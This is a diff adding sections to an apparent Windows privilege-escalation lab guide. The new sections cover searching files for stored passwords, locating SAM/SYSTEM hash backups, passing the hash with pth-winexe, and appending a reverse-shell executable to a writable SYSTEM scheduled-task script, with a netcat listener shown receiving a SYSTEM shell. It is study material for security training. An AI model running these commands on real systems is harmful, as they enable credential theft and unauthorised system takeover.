@@ -1131,6 +1131,138 @@ msedgewin10\admin
 
 ### 9.3 Configuration Files
 
+Some administrators will leave configuration files one the system with passwords in them.
+
+__Searching for Configuration fils__
+- Recursively search for foles in the current directory with `pass` in the name, pr ending in `.config`:
+```bash
+> dir /s *pass* == *.config
+```
+- Rescursively search for files in the current directory that contain the word `password` and also end in either `.xml`, `.ini`, or `.txt`
+```bash
+> findstr /si password *.xml *.ini *.txt
+```
+
+Running winpeas with `cmd searchfast filesinfo` switch
+__Sample output__
+
+```bash
+  [+] Unnattend Files()
+    C:\Windows\Panther\Unattend.xml
+```
+
+### 9.4 SAM
+
+- Windows stores password hashes in the Security Account manager (SAM).
+- The hashes are encrypted with a key which can be found ina file names `SYSTEM`.
+- If you have the ability to read the `SAM` and `SYSTEM` files, you can extract the hashes.
+- The `SAM` and `SYSTEM` files are located in the `C:\Windows\System32\config` directory.
+- The files are locked while windows is running.
+- backup of the files may exist in the `C:\Windows\Repair` or `C:\Windows\System32\config\Regback` directories.
+
+
+WinPEAS output
+```bash
+
+  [+] Looking for common SAM & SYSTEM backups()
+    C:\Windows\repair\SAM
+    C:\Windows\repair\SYSTEM
+```
+- Copy these files into kali
+- use `SAMdump` or `Pwdump` to crack the hashes
+
+
+
+### 9.5 Passing the Hash
+
+- Windows accepts hashes instead of passwords to authenticate to a number of services.
+- We can use a modified vertsion of `winexe`, `pth-winexe` to spawn a command prompt using the admin user's hash.
+
+```bash
+> pth-winexe -U 'admin%<hash>' //<ip> cmd.exe
+```
+- If we want a system shell
+
+```bash
+> pth-winexe --system -U 'admin%<hash>' //<ip> cmd.exe
+```
+
+## 10. Scheduled Tasks
+
+- Windows can be configured to run tasks at specific times, periodically(e.g. every 5 mins) or when triggered by some event(e.g. user logon).
+- tasks usually run with the privileges of the user who created them, however administrators can configure tasks to rn as other users, including SYSTEM.
+- There is no simple method for enumerating custom tasks that belong to other users as a low privileged user account.
+- List all scheduled tasks your `user` can see:
+```bash
+> schtasks /query /fo LIST /v
+```
+- In powershell:
+```bash
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsft*"} | ft TaskName,TaskPath,State
+```
+- A scheduled task can be seen in `Devtools` folder
+```bash
+C:\DevTools>dir
+ Volume in drive C is Windows 10
+ Volume Serial Number is B009-E7A9
+
+ Directory of C:\DevTools
+
+06/26/2021  01:15 AM    <DIR>          .
+06/26/2021  01:15 AM    <DIR>          ..
+06/26/2021  01:15 AM               173 CleanUp.ps1
+               1 File(s)            173 bytes
+               2 Dir(s)  24,475,549,696 bytes free
+
+C:\DevTools>type CleanUp.ps1
+# This script will clean up all your old dev logs every minute.
+# To avoid permissions issues, run as SYSTEM (should probably fix this later)
+
+Remove-Item C:\DevTools\*.log
+```
+- Check permission with `accesschk` to overwrite or append our reverse shell to it
+```bash
+
+C:\DevTools>C:\PrivEsc\.\accesschk.exe /accepteula -quv user CleanUp.ps1
+RW C:\DevTools\CleanUp.ps1
+        FILE_ADD_FILE
+        FILE_ADD_SUBDIRECTORY
+        FILE_APPEND_DATA
+        FILE_EXECUTE
+        FILE_LIST_DIRECTORY
+        FILE_READ_ATTRIBUTES
+        FILE_READ_DATA
+        FILE_READ_EA
+        FILE_TRAVERSE
+        FILE_WRITE_ATTRIBUTES
+        FILE_WRITE_DATA
+        FILE_WRITE_EA
+        DELETE
+        SYNCHRONIZE
+        READ_CONTROL
+```
+
+- Append reverse shell into `Cleanup.ps1` script (backup the script if necessary before appending)
+```bash
+C:\DevTools>echo C:\PrivEsc\reverse_9001.exe >> CleanUp.ps1
+```
+__Result__
+```bash
+shashi@kali)-[~/windows-priv-esc]
+└─$ nc -lvnp 9001  
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 50013
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+
+## 11. Insecure GUI Apps
+- 
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
 
